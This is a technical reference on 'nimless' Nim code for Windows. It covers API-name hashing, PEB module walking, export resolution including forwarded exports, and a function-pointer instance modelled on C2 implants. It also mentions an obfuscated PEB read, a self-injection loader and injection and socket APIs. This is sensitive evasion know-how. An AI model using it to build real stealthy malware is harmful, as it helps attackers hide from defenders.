# Runtime services - hash, module handle, proc address, instance

> **Provenance.** Verbatim code in this file comes from `src/0x04` through `src/0x12` as named in
> each section; the prose rationale is quoted from `src/0x11 - simple_instance/README.md` and
> `src/0x12 - nimless_DLL/README.md`, which are the only places the repo explains *why*. Section 2
> and Section 8 also record measurements taken with this pack's toolchain (nim 2.2.10, winim 4.0.0,
> gcc 13-win32, wine 9.0) - those are marked **[measured]**. Everything read straight off the code
> without measurement is marked **[code]**.

In nimless there is no IAT to fall back on: you resolve every Windows function yourself, exactly
once, and then keep the pointers. Four pieces do all the work - a hash, a module-handle walk, an
export-table walk, and an object to hold the results.

## 1. The hash

`src/0x11 - simple_instance/utils/hash.nim` (identical in 0x04-0x10 except for `.inline.` on
`hashStrW` in `0x07`):

```nim
import winim

proc hashStrA*(s: cstring): uint32 {.inline.} =
  var hash: uint32 = 0xff
  for i in s: hash = ((hash shl 5) + hash) + cast[uint32](i)
  return hash

proc hashStrW*(s: PWSTR): uint32  =
  var 
    hash: uint32 = 0xff
    pS = cast[ptr UncheckedArray[WCHAR]](s)
    idx: int = 0
  while pS[idx] != 0:
    hash = ((hash shl 5) + hash) + cast[uint32](pS[idx])
    idx.inc
  return hash
```

Properties that matter:

- Seed is `0xff`, and the step is `hash = ((hash shl 5) + hash) + c`, i.e. `h * 33 + c` in `uint32`
  arithmetic, so it wraps at 32 bits. It is the djb2 shape with a non-zero seed.
- `hashStrA` iterates a `cstring` (`for i in s` walks bytes until NUL). `hashStrW` walks `uint16`
  code units until the first zero.
- **Both produce the same number for an ASCII name [measured].** `hashStrW` adds
  `cast[uint32](codeUnit)` and `hashStrA` adds `cast[uint32](byte)`; for ASCII those values are
  equal, so `hashStrW(L"ntdll.dll") == hashStrA("ntdll.dll")`. Generation 1 of `gmh` in Section 2
  depends on this, and it was confirmed to resolve.
- It is used at compile time everywhere, so no literal ever has to exist in the binary:
  `static(hashStrA("GetProcessHeap".cstring))`.
- The same function hashes module names and export names - there is no domain separation, which is
  fine because the two never collide in practice, but it means you cannot "fix" `hashStrA` on one
  side only.
- `VX_TABLE_ENTRY.dwHash` (Section 8) stores exactly these values, which is what lets the HellsGate
  table be filled by the same hasher.

## 2. `gmh` - module handle from the PEB

There are two generations of the wrapper, and they have **different caller contracts**. Getting this
wrong yields a null handle, not a compile error.

### Generation 1 - hash the wide name (0x04 - 0x10)

`src/0x05 - heapalloc_ff/utils/gmh.nim`:

```nim
import winim
import hash

template doWhile(a, b: untyped): untyped =
  b
  while a:
    b

proc getModuleHandleH*(hash: uint32): HMODULE =
  var  
    pPeb: PPEB
  asm """
    mov rax, qword ptr gs:[0x60]
    :"=r"(`pPeb`)
  """
  let
    pLdr: PPEB_LDR_DATA = pPeb.Ldr
    pListHead: LIST_ENTRY = pPeb.Ldr.InMemoryOrderModuleList
  var
    pDte: PLDR_DATA_TABLE_ENTRY = cast[PLDR_DATA_TABLE_ENTRY](pLdr.InMemoryOrderModuleList.Flink)
    pListNode: PLIST_ENTRY = pListHead.Flink
  doWhile cast[int](pListNode) != cast[int](pListHead):
    if pDte.FullDllName.Length != 0:
      if hash == hashStrW(pDte.FullDllName.Buffer):
        return cast[HMODULE](pDte.Reserved2[0])
    pDte = cast[PLDR_DATA_TABLE_ENTRY](pListNode.Flink)
    pListNode = cast[PLIST_ENTRY](pListNode.Flink)
  return cast[HMODULE](0)

template gmh*(s: string): HANDLE =
  getModuleHandleH(static(hashStrA(s.cstring)))
```

Caller contract: pass the name **exactly as it appears in the PEB entry's `FullDllName`**, e.g.
`gmh("KERNEL32.DLL")`. The comparison is `hashStrW(pDte.FullDllName.Buffer)`, i.e. case-sensitive
over the whole string, extension included.

**[measured]** under wine, `FullDllName` for the loader's own entries is the lowercase base name
(`ntdll.dll`), so `gmh("ntdll.dll")` resolves while `gmh("KERNEL32.DLL")` and `gmh("kernel32")` do
not. On the author's Windows 10 target the same entries are uppercase (`KERNEL32.DLL`), which is why
the repo passes uppercase names and works there. This case sensitivity is the fragility the next
generation fixes.

### Generation 2 - lowercase prefix (0x11, 0x12)

`src/0x11 - simple_instance/utils/gmh.nim`:

```nim
import winim
import hash

template doWhile(a, b: untyped): untyped =
  b
  while a:
    b

template gmh*(s: string): HANDLE =
  getModuleHandleH(static(hashStrA(s.cstring)))

proc toLower(c: char): char {.inline.} =
  if c >= 'A' and c <= 'Z':
    return (c.int xor 0x20).char
  else: 
    return c

proc getModuleHandleH*(hash: uint32): HMODULE =
  var  
    pPeb: PPEB
  asm """
    mov rax, qword ptr gs:[0x60]
    :"=r"(`pPeb`)
  """
  let
    pLdr: PPEB_LDR_DATA = pPeb.Ldr
    pListHead: LIST_ENTRY = pPeb.Ldr.InMemoryOrderModuleList
  var
    pDte: PLDR_DATA_TABLE_ENTRY = cast[PLDR_DATA_TABLE_ENTRY](pLdr.InMemoryOrderModuleList.Flink)
    pListNode: PLIST_ENTRY = pListHead.Flink
  doWhile cast[int](pListNode) != cast[int](pListHead):
    if pDte.FullDllName.Length != 0:
      var 
        tmpStrA: array[MAX_PATH, CHAR]
        pStrW = cast[ptr UncheckedArray[int16]](pDte.FullDllName.Buffer)
        idx: int = 0
        isRunning = true
      while (isRunning):
        if pStrW[idx] == cast[int16]('.'):
          tmpStrA[idx] = 0.char
          isRunning = false
        if pStrW[idx] == 0:
          isRunning = false
        else:
          tmpStrA[idx] = toLower(pStrW[idx].CHAR)
          idx.inc
        if hash == hashStrA(cast[cstring](tmpStrA[0].addr)):
          return cast[HMODULE](pDte.Reserved2[0])
    pDte = cast[PLDR_DATA_TABLE_ENTRY](pListNode.Flink)
    pListNode = cast[PLIST_ENTRY](pListNode.Flink)
  return cast[HMODULE](0)
```

The motivation, from the 0x11 README: "In our custom implementation of `getModuleHandle`, we must pass in a hashed string that matches what is in the `PEB` exactly, such as `KERNEL32.DLL`. One improvement we can make to this is to compare our value as a lowercase string (`kernel32`) against a lowercase version of what is from `pDte.FullNameBuffer`."

Caller contract, **[measured]** - pass a lowercase prefix of the base name:

| Argument | Resolves? | Why |
|---|---|---|
| `"kernel32"` | yes | prefix of `kernel32.dll` |
| `"kernel"` | yes | any prefix matches |
| `"k"` | yes | single-letter prefix matches the first module starting with `k` |
| `"kernel32.d"` | **no** | the scan terminates at the first `.`, so nothing past it is ever hashed |
| `"KERNEL32.DLL"` | **no** | generation 2 hashes lowercased characters |
| `"bogus"` | no | no prefix match |

How it actually matches - and why the `'.'` branch is a red herring **[code]**:

1. `tmpStrA` is a zero-initialized `array[MAX_PATH, CHAR]`, re-declared per module.
2. Each loop iteration lowercases **one** character into `tmpStrA[idx]`, increments `idx`, and then
   compares `hashStrA` over the array. Because the byte after the last written one is still zero, the
   comparison made on entry `idx == n` hashes exactly the lowercased prefix of length `n`. For
   `kernel32.dll` the match for `gmh("kernel32")` therefore happens on the iteration that wrote the
   `'2'` - one step *before* the `'.'` is ever examined.
3. When the `'.'` is reached, the first `if` writes a NUL at `tmpStrA[idx]` and clears `isRunning`,
   but the following `if/else` (its `else` branch) immediately overwrites that byte with `'.'`, so
   the truncation never takes effect. The branch's only real effect is to stop the scan for that
   module. Do not "fix" it into a truncation unless you also re-derive the caller contract.

Two consequences worth internalizing:

- Short prefixes are dangerous: `gmh("k")` resolves whichever module is first in
  `InMemoryOrderModuleList` whose name starts with `k`. Always pass at least the full base name.
- Because matching is prefix-based, an extension-bearing name cannot match at all.

### The walk itself

Both generations read the PEB from the TEB with an inline asm load of `gs:[0x60]` and then follow
`InMemoryOrderModuleList`, wrapped in the local `doWhile` helper template (both listings are above).
`gs:[0x60]` is `TEB->ProcessEnvironmentBlock` on x86-64. The module base is read from
`pDte.Reserved2[0]` - the `DllBase` slot of `LDR_DATA_TABLE_ENTRY`. `doWhile(a, b)` expands to `b;
while a: b`, which is what makes the list-head comparison work after `pListNode` has already been
advanced. `0x07` obfuscates the PEB read into
`xor rax,rax / mov rax,0x10 / imul rax,rax,6 / mov rax,qword ptr gs:[rax]`, which computes the same
`gs:[0x60]` without the literal appearing as a displacement (see SKILL.md Section 11).

## 3. `gpa` - export address by hash

`src/0x12 - nimless_DLL/utils/gpa.nim` is the most complete version: it carries the superseded body
as a comment block and the shipped body below it, including the forwarded-export branch.

```nim
import winim

import gmh, hash 

proc strlenA(s: int): int {.inline.} =
  var sPtr = cast[ptr byte](s)
  while sPtr[] != 0.byte:
    sPtr = cast[ptr byte](cast[int](sPtr) + 1)
    result.inc

template gpa*[T](h: HANDLE, p: string, t: T): T =
  cast[typeof(t)](getProcAddressHash(h, static(hashStrA(p.cstring))))

# proc getProcAddressHash*(hModule: HMODULE, apiNameHash: uint32): FARPROC {.inline, noSideEffect.} =
#   var 
#     pBase = hModule
#     pImgDosHdr = cast[PIMAGE_DOS_HEADER](pBase)
#     pImgNtHdr = cast[PIMAGE_NT_HEADERS](cast[int](pBase) + pImgDosHdr.e_lfanew)
#   if (pImgDosHdr.e_magic != IMAGE_DOS_SIGNATURE) or (pImgNtHdr.Signature != IMAGE_NT_SIGNATURE):
#     return cast[FARPROC](0)
#   var
#     imgOptHdr = cast[IMAGE_OPTIONAL_HEADER](pImgNtHdr.OptionalHeader)
#     pImgExportDir = cast[PIMAGE_EXPORT_DIRECTORY](cast[int](pBase) + imgOptHdr.DataDirectory[0].VirtualAddress)
#     funcNameArray = cast[ptr UncheckedArray[DWORD]](cast[int](pBase) + pImgExportDir.AddressOfNames)
#     funcAddressArray = cast[ptr UncheckedArray[DWORD]](cast[int](pBase) + pImgExportDir.AddressOfFunctions)
#     funcOrdinalArray = cast[ptr UncheckedArray[WORD]](cast[int](pBase) + pImgExportDir.AddressOfNameOrdinals)
  
#   for i in 0 ..< pImgExportDir.NumberOfFunctions:
#     var pFunctionName = cast[cstring](cast[PCHAR](cast[int](pBase) + funcNameArray[i]))
#     if apiNameHash == hashStrA(pFunctionName):
#       return cast[FARPROC](cast[int](pBase) + funcAddressArray[funcOrdinalArray[i]])
#   return cast[FARPROC](0)

proc getProcAddressHash*(hModule: HMODULE, apiNameHash: uint32): FARPROC {.inline.} =
  var 
    pBase = hModule
    pImgDosHdr = cast[PIMAGE_DOS_HEADER](pBase)
    pImgNtHdr = cast[PIMAGE_NT_HEADERS](cast[int](pBase) + pImgDosHdr.e_lfanew)
  if (pImgDosHdr.e_magic != IMAGE_DOS_SIGNATURE) or (pImgNtHdr.Signature != IMAGE_NT_SIGNATURE):
    return cast[FARPROC](0)
  var
    imgOptHdr = cast[IMAGE_OPTIONAL_HEADER](pImgNtHdr.OptionalHeader)
    dwImgExportTableSize = imgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size
    pImgExportDir = cast[PIMAGE_EXPORT_DIRECTORY](cast[int](pBase) + imgOptHdr.DataDirectory[0].VirtualAddress)
    funcNameArray = cast[ptr UncheckedArray[DWORD]](cast[int](pBase) + pImgExportDir.AddressOfNames)
    funcAddressArray = cast[ptr UncheckedArray[DWORD]](cast[int](pBase) + pImgExportDir.AddressOfFunctions)
    funcOrdinalArray = cast[ptr UncheckedArray[WORD]](cast[int](pBase) + pImgExportDir.AddressOfNameOrdinals)
  
  for i in 0 ..< pImgExportDir.NumberOfFunctions:
    var 
      pFunctionName = cast[cstring](cast[PCHAR](cast[int](pBase) + funcNameArray[i]))
      pFunctionAddress = cast[int](pBase) + funcAddressArray[funcOrdinalArray[i]]
    if apiNameHash == hashStrA(pFunctionName):
      # Check if Forwarded function
      if (cast[int](pFunctionAddress) >= cast[int](pImgExportDir)) and (cast[int](pFunctionAddress) < cast[int](pImgExportDir) + dwImgExportTableSize):
        var 
          forwarderName: array[MAX_PATH, char]
          dotOffset: int
          lenForwarderName = strlenA(pFunctionAddress)
        # save the forwarder string into our ForwarderName Buffer 
        copyMem(forwarderName[0].addr, cast[pointer](pFunctionAddress), lenForwarderName)
        for i in 0 ..< lenForwarderName:
          if cast[ptr byte](cast[int](forwarderName[0].addr) + i)[] == '.'.byte:
            dotOffset = i
            cast[ptr byte](cast[int](forwarderName[0].addr) + i)[] = '\0'.byte
            break
        var 
          functionModule = cast[PCHAR](cast[int](forwarderName[0].addr))
          functionName = cast[PCHAR](cast[int](forwarderName[0].addr) + dotOffset + 1)
          # Can't use ninst here due to circular imports - I'm sure there's a different way to approach that
          # Updated kernel32
          pLoadLibraryA = cast[typeof(LoadLibraryA)](getProcAddressHash(gmh("kernel32"), static(hashStrA("LoadLibraryA".cstring))))
        return cast[FARPROC](getProcAddressHash(pLoadLibraryA(functionModule), hashStrA(cast[cstring](functionName))))
      # Not forwarded function
      else:
        return cast[FARPROC](pFunctionAddress)
  return cast[FARPROC](0)
```

The walk, in order:

1. `pImgDosHdr = pBase` and check `e_magic == IMAGE_DOS_SIGNATURE`; `pImgNtHdr` at
   `cast[int](pBase) + e_lfanew` and check `Signature == IMAGE_NT_SIGNATURE`.
2. `pImgExportDir` at `cast[int](pBase) + OptionalHeader.DataDirectory[0].VirtualAddress`, i.e.
   `IMAGE_DIRECTORY_ENTRY_EXPORT`.
3. Three parallel arrays: `AddressOfNames` (RVAs of name strings), `AddressOfFunctions` (RVAs of
   function bodies) and `AddressOfNameOrdinals` (index mapping name -> function slot).
4. For each name, `hashStrA(pFunctionName)` compared against the compile-time hash; on a hit the
   address is `pBase + funcAddressArray[funcOrdinalArray[i]]`.

The private `strlenA(s: int)` at the top takes the address as an `int` and walks bytes until a zero -
there is no libc `strlen` to call (and see `reference/build.md` Section 7: gcc must be told not to
invent one).

### Forwarded exports, and why the branch exists

The deck's 0x05 slide is the whole story:

> Q: Oh cool, GetProcAddress Replacement, but HeapAlloc doesn't work?
> A: Forwarded Functions

A forwarded export's RVA does not point at code; it points at an ASCII string `"DLL.Function"` that
lives *inside the export directory range*. The branch detects that with a range test:

```nim
      if (cast[int](pFunctionAddress) >= cast[int](pImgExportDir)) and (cast[int](pFunctionAddress) < cast[int](pImgExportDir) + dwImgExportTableSize):
```

then copies the string into `forwarderName`, finds the `'.'` with `strlenA` and `copyMem`, splits it
into `functionModule` / `functionName`, resolves `LoadLibraryA` **by hash**, and recurses:
`getProcAddressHash(pLoadLibraryA(functionModule), hashStrA(functionName))`. The split is in-place -
it writes `'\0'` over the `'.'` in the copy, and `functionName` is the byte after it.

`LoadLibraryA` cannot come from `ninst` here, and the repo says so in place:

```
# Can't use ninst here due to circular imports - I'm sure there's a different way to approach that
```

**Caution [code]:** the recursion resolves `"LoadLibraryA"` from `kernel32` via
`getProcAddressHash(gmh("kernel32"), ...)`. If the export you are resolving *is* a forwarded
`LoadLibraryA`, that inner lookup re-enters the same branch and does not terminate.
Kernelbase-forwarded exports (the `HeapAlloc` case above) are fine because the recursion goes
through a fresh module. Resolve `LoadLibraryA` first in `init`, and test the specific module you
care about.

### Two defects to know about before copying `getProcAddressHash` **[code]**

- **Loop bound.** `for i in 0 ..< pImgExportDir.NumberOfFunctions:` indexes `funcNameArray`, but
  `AddressOfNames` only holds `NumberOfNames` entries. In any module where the two differ (modules
  with ordinal-only exports, e.g. `ntdll`), the tail of the loop reads past the name table into the
  adjacent ordinal/address tables and hashes whatever is there - a garbage pointer can hash to a
  match and return a bogus address. Bound by `NumberOfNames`, or bounds-check the name index.
- **No validation of the name pointer.** `pFunctionName` is trusted to be NUL-terminated and inside
  the image. That is normal for this kind of code, but it is why a wrong `hModule` (Section 2's
  prefix trap) turns into a wild read rather than a clean failure.

### The `Dl_<n>_` failure mode - resolution that never happened **[measured]**

If you call a Windows API directly through winim instead of through `gpa`/the instance, the build
still *links*: winim's `dynlib` procs reference a `Dl_<hash>_` variable that the Nim runtime was
supposed to fill in during `DatInit`. Nothing runs `DatInit` here, so the slot stays null and the
call jumps to address 0.

```
x86_64-w64-mingw32-nm out.exe | grep Dl_     # needs an UNSTRIPPED build
```

**[measured]** on this pack's template, adding one `discard GetProcessHeap()` left
`Dl_1543506257_` in `.data` (with `.data$Dl_1543506257_` and a `.refptr.Dl_1543506257_` in
`.rdata`), pulled in an undefined `atexit`, grew the image from 4 608 to 15 231 bytes, and
page-faulted at RIP `0` with `rax` holding the address of the empty slot. There is no warning at
compile or link time. SKILL.md Section 5 has the diagnostic procedure; `reference/build.md`
Section 6 covers the strip flags that remove the symbol names you would grep for.

## 4. The typed `gpa` template

`src/0x05 - heapalloc_ff/utils/gpa.nim` (identical in 0x11/0x12 modulo the wrapper name):

```nim
template gpa*[T](h: HANDLE, p: string, t: T): T =
  cast[typeof(t)](getProcAddressHash(h, static(hashStrA(p.cstring))))
```

The third parameter exists **only** to carry the type: `t` is never evaluated. It is there so
`typeof(t)` can be the cast target, and so the caller gets a callable function pointer of the right
signature instead of a `FARPROC`. Winim is where those types come from - the deck's 0x04 slide:
"Winim is doing heavy lifting for us on typecasting; if not in winim, operator has to define."

## 5. `NIMLESS_INSTANCE` - your stdlib

Why it exists, verbatim from the 0x11 README:

> One probable problem we have with writing nimless nim is the reuse of our `getModuleHandle` and `getProcAddress` replacements. We might be calling multiple functions throughout our program and it's wasteful to always be accessing the `PEB` for the module handle and resolving pointers to functions. One solution to this is to create an instance to hold our handles and function pointers, so we aren't needlessly calling them over and over again. It is what many C2 frameworks do, such as [Havoc](https://github.com/HavocFramework/Havoc). First off we can start with some more improvements to the overall nimless framework.

### Shape

The type declarations are plain objects whose fields are *function types*, plus one `HMODULE` per
module. This is `src/0x12 - nimless_DLL/instance.nim`, the first two objects plus the `BCRYPT` group
it adds:

```nim
  MODULES* {.pure.} = object
    advapi32*: HMODULE
    bcrypt*:   HMODULE
    kernel32*: HMODULE
    ntdll*:    HMODULE
    user32*:   HMODULE
    ws2_32*:   HMODULE


  WIN32* {.pure.} = object
    # KERNEL32.DLL
    CloseHandle*:                 type(CloseHandle)
    CreateFileW*:                 type(CreateFileW)
    CreateProcessA*:              type(CreateProcessA)
    DuplicateHandle*:             type(DuplicateHandle)
    ExitProcess*:                 type(winbase.ExitProcess)
    GetComputerNameExA*:          type(GetComputerNameExA)
    GetCurrentDirectoryA*:        type(GetCurrentDirectoryA)
    GetCurrentProcess*:           type(GetCurrentProcess)
    GetModuleFileNameW*:          type(GetModuleFileNameW)
    GetModuleHandleA*:            type(winbase.GetModuleHandleA)
    GetProcessHandleCount*:       type(GetProcessHandleCount)
    GetLastError*:                type(GetLastError)
    GetProcAddress*:              type(winbase.GetProcAddress)
    GetProcessHeap*:              type(GetProcessHeap)
    GetStdHandle*:                type(GetStdHandle)
    HeapAlloc*:                   type(HeapAlloc)
    HeapFree*:                    type(HeapFree)
    LoadLibraryA*:                type(LoadLibraryA)
    LocalAlloc*:                  type(LocalAlloc)
    LocalFree*:                   type(winbase.LocalFree)
    OpenProcess*:                 type(OpenProcess)
    SetFileInformationByHandle*:  type(SetFileInformationByHandle)
    Sleep*:                       type(winbase.Sleep)
    WriteConsoleA*:               type(WriteConsoleA)
    VirtualAllocEx*:              type(VirtualAllocEx)
    VirtualProtectEx*:            type(VirtualProtectEx)
    WriteProcessMemory*:          type(WriteProcessMemory)

    # Advapi32.DLL
    GetUserNameA*:                type(GetUserNameA)

    # NTDLL
    NtQuerySystemInformation*:    type(NtQuerySystemInformation)

    # USER32.DLL
    MessageBoxA*:                 type(MessageBoxA)
    MessageBoxW*:                 type(MessageBoxW)
    wsprintfA*:                   type(winuser.wsprintfA)

    # ws2_32.dll
    WSASocketA*:                  type(WSASocketA)
    WSAStartup*:                  type(WSAStartup)
    inet_addr*:                   type(inet_addr)
    htons*:                       type(htons)
    connect*:                     type(connect)
  
  BCRYPT* = object
    BCryptOpenAlgorithmProvider*:   type(BCryptOpenAlgorithmProvider)
    BCryptGetProperty*:             type(BCryptGetProperty)
    BCryptSetProperty*:             type(BCryptSetProperty)
    BCryptGenerateSymmetricKey*:    type(BCryptGenerateSymmetricKey)
    BCryptDecrypt*:                 type(BCryptDecrypt)
    BCryptDestroyKey*:              type(BCryptDestroyKey)
    BCryptCloseAlgorithmProvider*:  type(BCryptCloseAlgorithmProvider)


  
```

`{.pure.}` means those fields are accessed qualified (`.Win32.X`), whereas `BCRYPT` is a plain
object. Each field is `type(SomeWinApiProc)`, so `ninst.Win32.ExitProcess` *is* a typed proc
variable, not a number you must cast at every call site.

### The macro

```nim
#[ Macro to initialize the function pointers ]#
proc makeCast(inst, modul, handl, class, fn: NimNode): NimNode =
  result = newNimNode(nnkCast)
  var 
    callExpr1 = newNimNode(nnkCall)
    callExpr2 = newNimNode(nnkCall)
  callExpr1.add(ident"type", newDotExpr(newDotExpr(inst, class), fn))
  callExpr2.add(ident"getProcAddressHash", 
                newDotExpr(newDotExpr(inst, modul), handl),
                newCall(
                  ident"static",
                  newCall(
                    ident"hashStrA",
                    newDotExpr(toStrLit(fn), ident"cstring")
                  )
                )
              )
  result.add(callExpr1)
  result.add(callExpr2)
  
  
macro getFuncPtr*(sect0, sect1): untyped =
  result = newStmtList()
  var 
    inst  = sect0[0][0]
    modul = sect0[0][1]
    handl = sect0[1]
    class = sect1[0][1]
    fn    = sect1[1]
    asgnNode = newNimNode(nnkAsgn)
    instExpr = newDotExpr(newDotExpr(inst, class), fn)
    castExpr = makeCast(inst, modul, handl, class, fn)
  asgnNode.add(instExpr)
  asgnNode.add(castExpr)
  result.add(asgnNode)
```

The README derives that macro from `dumpTree`, and documents the two calls it has to build:

```nim
ninst.Win32.GetProcessHeap = gpa(ninst.Modules.kernel32, "GetProcessHeap", GetProcessHeap)

# expands to
cast[type(ninst.Win32.GetProcessHeap)](
  getProcAddressHash(ninst.Modules.kernel32, static(hashStrA("GetProcessHeap".cstring)))
)
```

`makeCast` builds the `Cast` node with two `Call` children (the `type(...)` and the
`getProcAddressHash(...)` tree, with `static(hashStrA(...))` nested inside), and `getFuncPtr`
destructures its arguments into `inst`, `modul`, `handl`, `class` and `fn` before emitting the
`Asgn`.

**Argument-shape constraint [measured]:** the macro indexes `sect0` as a `DotExpr` of `DotExpr`
(`sect0[0][0]` = `inst`, `sect0[0][1]` = `modul`) and `sect1` as a `DotExpr` (`sect1[0][1]` =
`class`). Passing a bare module-handle variable instead of a `ninst.Module.<field>` path fails to
compile with `Error: cannot get child of node kind: nnkIdent`. Every module handle therefore belongs
in `MODULES` - even one you never look at again - rather than in a local.

### Initialization

```nim
#[ Initialization Functions ]#
proc init*(ninst: var NIMLESS_INSTANCE): bool = 
  # Load Kernel32 Functions
  ninst.Module.kernel32 = gmh("kernel32")
  if ninst.Module.kernel32 != 0:
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.CloseHandle)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.CreateFileW)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.CreateProcessA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.ExitProcess)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetComputerNameExA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetCurrentDirectoryA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetModuleFileNameW)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetLastError)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetProcessHeap)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetStdHandle)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.LoadLibraryA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.LocalAlloc)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.LocalFree)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.SetFileInformationByHandle)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.Sleep)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.WriteConsoleA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.VirtualAllocEx)
  else: return false

  # Load Advapi32.dll
  var advapi {.stackStringA.} = "Advapi32.dll" 
  ninst.Module.advapi32 = ninst.Win32.LoadLibraryA(cast[cstring](advapi[0].addr))
  if ninst.Module.advapi32 != 0:
    getFuncPtr(ninst.Module.advapi32, ninst.Win32.GetUserNameA)
  else: return false

  # Load USER32.dll
  var user32 {.stackStringA.} = "user32.dll"
  ninst.Module.user32 = ninst.Win32.LoadLibraryA(cast[cstring](user32[0].addr))
  if ninst.Module.user32 != 0:
    getFuncPtr(ninst.Module.user32, ninst.Win32.wsprintfA)
  else: return false

  # Load ws_32.dll
  var ws2_32 {.stackStringA.} = "ws2_32.dll"
  ninst.Module.ws2_32= ninst.Win32.LoadLibraryA(cast[cstring](ws2_32[0].addr))
  if ninst.Module.user32 != 0:
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.WSASocketA)
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.WSAStartup)
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.inet_addr)
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.htons)
    getFuncPtr(ninst.Module.ws2_32, ninst.Win32.connect)
  else: return false




  ninst.IsInitialized = true
  
  return true
```

and the ordering rule the 0x12 version adds at the top of the `kernel32` block:

```
  ninst.Module.kernel32 = gmh("kernel32")
  if ninst.Module.kernel32 != 0:
    # Do load library first incase of forwarded functions
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.LoadLibraryA)
```

The 0x12 `init` also shows the pattern for a module winim does not type for you: `ntdll`, `bcrypt`
and `user32` are each loaded with `LoadLibraryA` on a `{.stackStringA.}` name and then filled in with
`getFuncPtr`, with `return false` on any failure. `init` returns `bool`; the caller either checks it
or ignores it with `discard init(ninst)`.

### Global vs stack

```nim
#[ Global Instance ]#
var ninst*: NIMLESS_INSTANCE
```

> When used on the stack, you will have to pass it into the functions you wish to call the WinAPI with.

A stack instance is usable, but then every callee that needs WinAPI access must take it as a
parameter (`doSomething(&ninst)`), which is why the examples default to the global. Note that
`utils/stdio.nim` reads `ninst.Win32.wsprintfA` *without* checking `IsInitialized`, so printing
before a successful `init` jumps through a null pointer.

### Caveats

- Winim name ambiguity: > If winim has multiple definitions for one function (I.e: `ExitProcess`), you must define which file of winim to import from, as it will be ambiguous as compile-time. Alternatively, you can type declare the functions yourself.
  Concretely, `ExitProcess` is written `type(winbase.ExitProcess)`, and `LocalFree`, `Sleep` and
  `GetModuleHandleA` need the same treatment. `src/0x11 - simple_instance/instance.nim` and
  `src/0x12 - nimless_DLL/instance.nim` are the reference lists of which names need qualifying.
- Your own declarations: > What is cool about this, is we are solely passing in the objects and the macro is generating our function calls based on the names of the objects. Just like in how we use `gpa` to rely on `winim` for getting the types of the function, the macro will use the same way. If the function is not defined in `winim`, it will have to be declared by the operator.
  Nothing stops you from declaring a type and a `gpa` call by hand for an API winim lacks; the
  instance pattern does not require winim at all, only the typing.
- Forwarded functions: resolve `LoadLibraryA` first (Section 3).

## 6. The entry contract

Two symbols. `Main` is an ordinary proc; `start` is the PE entry, pinned to the start of `.text` by
`codegenDecl`. This is the template's pair verbatim:

```nim
## nimless template - the two-symbol entry contract plus a runnable body.
##
##   Main  - a normal `{.exportc.}` proc; it is a callee, not the entry point.
##   start - the real entry: `.text`-pinned via codegenDecl, aligns the stack,
##           calls Main, returns. `-Wl,-estart` in nim.cfg points the PE entry here.
##
## Build (from this directory):
##   nim c -d:mingw -d:malDebug main.nim -o:verify_debug.exe   # PRINTA + console
##   nim c -d:mingw main.nim -o:verify_stripped.exe            # release, quiet
## See reference/build.md for the flags and reference/runtime.md for the instance.
import winim/lean

import instance
import utils/[stdio, stackstr]

{.passC:"-masm=intel".}

proc main() {.exportc: "Main".} =
  discard init(ninst)

  PRINTA("[+] nimless template: no runtime, no imports\n".cstring)

  var s {.stackStringA.} = "stack string"
  PRINTA("[+] %s at %p\n".cstring, cast[cstring](s[0].addr), cast[int](s[0].addr))

  ninst.Win32.ExitProcess(42)

proc start() {.asmNoStackframe, codegenDecl: "__attribute__((section (\".text\"))) $# $#$#", exportc: "start".} =
  asm """
    and rsp, 0xfffffffffffffff0
    sub rsp, 0x10
    call Main
    add rsp, 0x10
    ret
  """

when isMainModule:
  start()
```

Notes:

- `{.asmNoStackframe.}` stops Nim from emitting its own prologue/epilogue, so the `and rsp,
  0xfffffffffffffff0` / `sub rsp, 0x10` you wrote is what runs. There is no CRT that set the stack up
  for you.
- `exportc: "start"` is what `--l:"-Wl,-estart"` refers to; the names must match exactly.
- `when isMainModule: start()` is how the body gets emitted at all with `--noMain:on`.
- `{.passC:"-masm=intel".}` accompanies every file containing `asm` in this repo (the config carries
  it too; the per-file pragma keeps the file self-contained).
- Without a runtime there is nothing to return to, so `Main` ends with
  `ninst.Win32.ExitProcess(<code>)`. The deck's 0x03 slide states it plainly: "Does not exit cleanly:
  Required to call ExitProcess". **[measured]** the template's `ExitProcess(42)` yields exit code 42
  under wine. A DLL instead returns `true` from `DllMain` and the host process decides the rest.

The stack-adjustment variants in the repo. `src/0x05 - heapalloc_ff/main.nim` preserves `rsi` rather
than only aligning:

```nim
proc start() {.asmNoStackframe, exportc: "start".} =
  asm """
    push rsi
    mov rsi, rsp
    and rsp, 0xfffffffffffffff0
    sub rsp, 0x20
    call Main
    mov rsp, rsi
    pop rsi
    ret
  """
```

`src/0x07 - self_injection_loader_obfuscated/main.nim` saves `rbp` (a decoy - nothing restores it
before `ret`):

```nim
proc start() {.asmNoStackframe, codegenDecl: "__attribute__((section (\".text\"))) $# $#$#", exportc: "start".} =
  asm """
    and rsp, 0xfffffffffffffff0
    mov rbp, rsp
    sub rsp, 0x10
    call Main
    add rsp, 0x10
    ret
  """
```

`src/0x12 - nimless_DLL/dll_main.nim` replaces the pair with a DLL entry point, using `stdcall`,
`exportc` and `dynlib` together:

```nim
proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReason: LPVOID): BOOL {.stdcall, exportc:"DLLMain", dynlib.} =
  discard ninst.init()

